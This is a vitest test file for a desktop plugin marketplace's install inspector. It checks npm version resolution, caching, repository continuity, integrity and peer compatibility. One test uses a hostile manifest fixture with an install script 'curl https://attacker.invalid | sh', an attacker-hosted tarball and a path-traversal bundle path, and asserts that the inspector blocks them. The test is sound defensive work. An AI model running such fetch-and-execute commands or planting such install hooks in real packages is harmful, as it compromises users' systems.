import { Buffer } from 'node:buffer';

import { describe, expect, it, vi } from 'vitest';
import { createPluginProfileGeneration } from './plugin-profile-bootstrap.js';

interface Inspector {
  inspect(identity: {
    readonly sourceRecordId: string;
    readonly itemId: string;
    readonly versionPreference?: 'catalog' | 'latest';
  }): Promise<Record<string, unknown>>;
  inspectExternalVerified(identity: {
    readonly packageName: string;
    readonly currentVersion: string;
    readonly repository: string;
    readonly versionPreference?: 'catalog' | 'latest';
  }): Promise<Record<string, unknown>>;
}

const item = {
  id: 'dshfind:community/example',
  displayName: 'Example',
  repository: 'https://github.com/community/example',
  package: { name: '@community/dsh-example', version: '1.2.3' },
  installability: { state: 'candidate', reason: 'provider-verified-repository-backlink' },
  provenance: { sourceId: 'dshfind' },
};

const manifest = {
  name: '@community/dsh-example',
  version: '1.2.3',
  repository: { type: 'git', url: 'git+https://github.com/community/example.git' },
  dsh: { bundle: { patch: './cordis.patch.yml' } },
  engines: { node: '^22.19.0 || >=24.0.0' },
  dependencies: { alpha: '^1.0.0', beta: '2.0.0' },
  peerDependencies: { react: '^18.0.0' },
  scripts: { test: 'vitest run' },
  dist: {
    integrity: `sha512-${Buffer.alloc(64, 7).toString('base64')}`,
    tarball: 'https://registry.npmjs.org/@community/dsh-example/-/dsh-example-1.2.3.tgz',
    fileCount: 12,
    unpackedSize: 40_000,
  },
};

async function createInspector(options: Record<string, unknown> = {}): Promise<Inspector> {
  const module = await import(
    new URL('../../../runtime/desktop-market-plugin/install-inspector.js', import.meta.url).href
  ) as { readonly createInstallInspector: (options: Record<string, unknown>) => Inspector };
  return module.createInstallInspector({
    catalog: { read: async () => ({ items: [item] }) },
    requestManifest: async () => manifest,
    requestPackument: async () => ({ 'dist-tags': { latest: item.package.version } }),
    now: () => Date.parse('2026-08-21T13:00:00.000Z'),
    platform: 'darwin',
    architecture: 'arm64',
    graphResolver: {
      resolve: async () => ({
        status: 'frozen', root: '@community/dsh-example@1.2.3', nodes: [{ id: '@community/dsh-example@1.2.3' }],
        hash: `sha256:${'a'.repeat(64)}`,
        summary: { nodes: 4, edges: 3, direct: 2, peers: 1, peerRequirements: 3, peerSatisfied: 3, peerOptionalMissing: 0, peerBlocked: 0, optionalSkipped: 0, maxDepth: 2 },
        peerCompatibility: { status: 'compatible', runtimeSnapshotHash: `sha256:${'b'.repeat(64)}` },
      }),
    },
    artifactVerifier: {
      verify: async () => ({
        status: 'verified', lockHash: `sha256:${'c'.repeat(64)}`,
        installationPlan: { schemaVersion: 1, root: '@community/dsh-example@1.2.3' },
        summary: { artifacts: 4, compressedBytes: 10_000, unpackedBytes: 40_000, fileCount: 12, cache: 'content-addressed' },
      }),
    },
    ...options,
  });
}

describe('desktop market install inspector', () => {
  it('resolves a stale catalog entry to the newer npm latest version before inspection', async () => {
    const staleItem = {
      ...item,
      package: { name: '@community/dsh-example', version: '0.3.0' },
    };
    const latestManifest = {
      ...manifest,
      version: '0.4.10',
      dist: {
        ...manifest.dist,
        tarball: 'https://registry.npmjs.org/@community/dsh-example/-/dsh-example-0.4.10.tgz',
      },
    };
    const requestManifest = vi.fn(async () => latestManifest);
    const inspector = await createInspector({
      catalog: { read: async () => ({ items: [staleItem] }) },
      requestPackument: async () => ({ 'dist-tags': { latest: '0.4.10' } }),
      requestManifest,
    });

    const result = await inspector.inspect({ sourceRecordId: 'dshfind', itemId: item.id });

    expect(requestManifest).toHaveBeenCalledWith('@community/dsh-example', '0.4.10');
    expect(result).toMatchObject({
      status: 'artifact-verified',
      identity: {
        packageName: '@community/dsh-example',
        version: '0.4.10',
        catalogVersion: '0.3.0',
      },
    });
  });

  it('keeps the exact catalog version when explicitly selected', async () => {
    const staleItem = {
      ...item,
      package: { name: '@community/dsh-example', version: '0.3.0' },
    };
    const catalogManifest = {
      ...manifest,
      version: '0.3.0',
      dist: {
        ...manifest.dist,
        tarball: 'https://registry.npmjs.org/@community/dsh-example/-/dsh-example-0.3.0.tgz',
      },
    };
    const requestManifest = vi.fn(async () => catalogManifest);
    const requestPackument = vi.fn();
    const inspector = await createInspector({
      catalog: { read: async () => ({ items: [staleItem] }) },
      requestPackument,
      requestManifest,
    });

    const result = await inspector.inspect({
      sourceRecordId: 'dshfind', itemId: item.id, versionPreference: 'catalog',
    });

    expect(requestPackument).not.toHaveBeenCalled();
    expect(requestManifest).toHaveBeenCalledWith('@community/dsh-example', '0.3.0');
    expect(result).toMatchObject({
      identity: { version: '0.3.0', catalogVersion: '0.3.0' },
    });
  });

  it('keeps catalog and latest inspections in separate cache entries', async () => {
    const requestManifest = vi.fn(async () => manifest);
    const inspector = await createInspector({ requestManifest });

    await inspector.inspect({
      sourceRecordId: 'dshfind', itemId: item.id, versionPreference: 'catalog',
    });
    await inspector.inspect({
      sourceRecordId: 'dshfind', itemId: item.id, versionPreference: 'latest',
    });

    expect(requestManifest).toHaveBeenCalledTimes(2);
  });

  it('inspects an installed external package without requiring a catalog record', async () => {
    const latestManifest = {
      ...manifest,
      version: '1.3.0',
      dist: {
        ...manifest.dist,
        tarball: 'https://registry.npmjs.org/@community/dsh-example/-/dsh-example-1.3.0.tgz',
      },
    };
    const requestManifest = vi.fn(async () => latestManifest);
    const inspector = await createInspector({
      catalog: { read: vi.fn(() => { throw new Error('catalog must not be used'); }) },
      requestPackument: async () => ({ 'dist-tags': { latest: '1.3.0' } }),
      requestManifest,
    });

    const result = await inspector.inspectExternalVerified({
      packageName: item.package.name,
      currentVersion: item.package.version,
      repository: 'git+https://github.com/community/example.git',
      versionPreference: 'latest',
    });

    expect(requestManifest).toHaveBeenCalledWith(item.package.name, '1.3.0');
    expect(result).toMatchObject({
      value: {
        status: 'artifact-verified',
        identity: {
          sourceRecordId: 'external-installed',
          packageName: item.package.name,
          catalogVersion: item.package.version,
          version: '1.3.0',
        },
      },
      installation: { candidate: { packageName: item.package.name, version: '1.3.0' } },
    });
  });

  it('blocks external adoption when npm repository continuity does not match', async () => {
    const inspector = await createInspector();
    const result = await inspector.inspectExternalVerified({
      packageName: item.package.name,
      currentVersion: item.package.version,
      repository: 'https://github.com/another-owner/another-repository',
      versionPreference: 'catalog',
    });

    expect(result).toMatchObject({ value: { status: 'blocked', blockers: ['repository'] } });
  });

  it('rejects unknown version preferences', async () => {
    const inspector = await createInspector();
    await expect(inspector.inspect({
      sourceRecordId: 'dshfind',
      itemId: item.id,
      versionPreference: 'newest' as never,
    })).rejects.toMatchObject({ code: 'catalog:invalid-request' });
  });

  it('keeps an explicitly hardware-tested version pinned when the catalog version is selected', async () => {
    const verifiedItem = {
      ...item,
      developerVerification: {
        testedAt: '2026-08-23T03:00:00.000Z',
        platforms: ['darwin-arm64'],
        harnessVersion: '0.1.1-rc.2',
      },
    };
    const requestPackument = vi.fn();
    const inspector = await createInspector({
      catalog: { read: async () => ({ items: [verifiedItem] }) },
      requestPackument,
    });

    const result = await inspector.inspect({
      sourceRecordId: 'dshfind', itemId: item.id, versionPreference: 'catalog',
    });

    expect(requestPackument).not.toHaveBeenCalled();
    expect(result).toMatchObject({ identity: { version: '1.2.3', catalogVersion: '1.2.3' } });
  });

  it('verifies graph, Runtime compatibility, artifact bytes, and frozen lock without claiming it is executable', async () => {
    const requestManifest = vi.fn(async () => manifest);
    const inspector = await createInspector({ requestManifest });
    const result = await inspector.inspect({ sourceRecordId: 'dshfind', itemId: item.id });

    expect(requestManifest).toHaveBeenCalledWith('@community/dsh-example', '1.2.3');
    expect(result).toMatchObject({
      schemaVersion: 1,
      status: 'artifact-verified',
      executionReady: false,
      identity: { sourceRecordId: 'dshfind', itemId: item.id, packageName: '@community/dsh-example', version: '1.2.3' },
      artifact: { integrityAlgorithm: 'sha512', verificationStatus: 'verified', verifiedArtifacts: 4, verifiedCompressedBytes: 10_000, verifiedUnpackedBytes: 40_000, verifiedFileCount: 12, cache: 'content-addressed' },
      bundle: { patch: 'cordis.patch.yml' },
      dependencySummary: { direct: 2, peers: 1, graphStatus: 'frozen', nodes: 4, edges: 3, maxDepth: 2, peerSatisfied: 3, peerBlocked: 0 },
      graphHash: `sha256:${'a'.repeat(64)}`,
      lockHash: `sha256:${'c'.repeat(64)}`,
      profileGeneration: expect.stringMatching(/^gen-[a-f0-9]{64}$/u),
      runtimeSnapshotHash: `sha256:${'b'.repeat(64)}`,
      lifecycleScripts: [],
      blockers: [],
    });
    expect(result).not.toHaveProperty('previewId');
    expect(result).not.toHaveProperty('installationPlan');
    expect(result.profileGeneration).toBe(createPluginProfileGeneration({
      packageName: item.package.name,
      version: item.package.version,
      integrity: manifest.dist.integrity,
      sourceId: item.provenance.sourceId,
      bundlePath: 'cordis.patch.yml',
      graphHash: `sha256:${'a'.repeat(64)}`,
      lockHash: `sha256:${'c'.repeat(64)}`,
    }));
    expect(JSON.stringify(result)).not.toContain('.tgz');
    expect(JSON.stringify(result)).not.toContain('vitest run');
  });

  it('keeps the frozen plan on the Host-only inspection interface', async () => {
    const inspector = await createInspector() as Inspector & {
      inspectVerified(identity: { sourceRecordId: string; itemId: string }): Promise<Record<string, unknown>>;
    };
    const internal = await inspector.inspectVerified({ sourceRecordId: 'dshfind', itemId: item.id });

    expect(internal).toMatchObject({
      value: { status: 'artifact-verified', executionReady: false },
      installation: {
        generation: expect.stringMatching(/^gen-[a-f0-9]{64}$/u),
        candidate: { packageName: item.package.name, bundlePath: 'cordis.patch.yml' },
        plan: { schemaVersion: 1, root: '@community/dsh-example@1.2.3' },
      },
    });
    expect(JSON.stringify((internal as { value: unknown }).value)).not.toContain('installationPlan');
  });

  it('fails closed on repository, integrity, lifecycle, platform, and bundle problems', async () => {
    const inspector = await createInspector({
      requestManifest: async () => ({
        ...manifest,
        repository: 'https://github.com/attacker/other',
        deprecated: 'obsolete',
        os: ['linux'],
        scripts: { install: 'curl https://attacker.invalid | sh', prepare: 'node build.js' },
        dsh: { bundle: { patch: '../../outside.yml' } },
        dist: { ...manifest.dist, integrity: 'sha1-invalid', tarball: 'https://attacker.invalid/plugin.tgz' },
      }),
    });
    const result = await inspector.inspect({ sourceRecordId: 'dshfind', itemId: item.id });

    expect(result).toMatchObject({
      status: 'blocked', executionReady: false,
      lifecycleScripts: ['install'],
      blockers: ['repository', 'deprecated', 'lifecycle-scripts', 'integrity', 'tarball-origin', 'platform', 'dsh-bundle'],
    });
    const serialized = JSON.stringify(result);
    expect(serialized).not.toContain('attacker.invalid');
    expect(serialized).not.toContain('curl ');
  });

  it('reports sanitized peer conflicts while preserving the frozen dependency graph', async () => {
    const inspector = await createInspector({
      graphResolver: {
        resolve: async () => ({
          status: 'frozen', root: '@community/dsh-example@1.2.3', nodes: [{ id: '@community/dsh-example@1.2.3' }],
          hash: `sha256:${'a'.repeat(64)}`,
          summary: { nodes: 4, edges: 3, direct: 2, peers: 1, peerRequirements: 2, peerSatisfied: 0, peerOptionalMissing: 0, peerBlocked: 2, optionalSkipped: 0, maxDepth: 2 },
          peerCompatibility: {
            status: 'blocked', runtimeSnapshotHash: `sha256:${'b'.repeat(64)}`,
            resolutions: [
              { from: '@community/dsh-example@1.2.3', name: '@deepseek-ai/missing', range: '^1.0.0', state: 'missing' },
              { from: '@community/dsh-example@1.2.3', name: 'react', range: '^19.0.0', state: 'incompatible', available: ['18.3.1'] },
            ],
          },
        }),
      },
    });
    const result = await inspector.inspect({ sourceRecordId: 'dshfind', itemId: item.id });

    expect(result).toMatchObject({
      status: 'blocked',
      blockers: ['peer-compatibility'],
      dependencySummary: { graphStatus: 'frozen', peerBlocked: 2 },
      peerIssues: [
        { packageName: '@deepseek-ai/missing', required: '^1.0.0', state: 'missing', available: [] },
        { packageName: 'react', required: '^19.0.0', state: 'incompatible', available: ['18.3.1'] },
      ],
    });
    expect(JSON.stringify(result)).not.toContain('resolutions');
  });

  it('resolves the package identity from the trusted catalog instead of renderer input', async () => {
    const requestManifest = vi.fn(async () => manifest);
    const inspector = await createInspector({ requestManifest });
    await expect(inspector.inspect({
      sourceRecordId: 'dshfind', itemId: 'dshfind:missing',
    })).rejects.toMatchObject({ code: 'catalog:item-not-found' });
    expect(requestManifest).not.toHaveBeenCalled();
  });

  it('rejects browse-only entries before contacting npm', async () => {
    const requestManifest = vi.fn();
    const inspector = await createInspector({
      catalog: { read: async () => ({ items: [{ ...item, installability: { state: 'browse-only' } }] }) },
      requestManifest,
    });
    await expect(inspector.inspect({ sourceRecordId: 'dshfind', itemId: item.id }))
      .rejects.toMatchObject({ code: 'catalog:not-candidate' });
    expect(requestManifest).not.toHaveBeenCalled();
  });

  it('coalesces concurrent inspections and caches the normalized result', async () => {
    const requestManifest = vi.fn(async () => manifest);
    const inspector = await createInspector({ requestManifest });
    const identity = { sourceRecordId: 'dshfind', itemId: item.id };
    const [first, second] = await Promise.all([inspector.inspect(identity), inspector.inspect(identity)]);
    const cached = await inspector.inspect(identity);
    expect(first).toBe(second);
    expect(cached).toBe(first);
    expect(requestManifest).toHaveBeenCalledOnce();
  });
});
